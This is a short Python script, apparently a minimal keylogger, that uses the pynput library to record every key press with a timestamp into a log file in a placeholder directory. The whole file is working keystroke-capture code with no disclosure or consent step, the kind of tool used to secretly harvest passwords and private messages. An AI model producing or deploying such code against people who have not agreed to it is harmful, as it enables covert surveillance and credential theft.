from pynput.keyboard import Listener
import logging

logDir = '/PREFERRED_DIRECTORY/'

logging.basicConfig(filename=(logDir + 'log.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')


try:
    def on_press(key):
        logging.info(str(key))


    with Listener(on_press=on_press) as listener:
        listener.join()

except KeyboardInterrupt:
    with Listener(on_press=on_press) as listener:
        listener.stop()
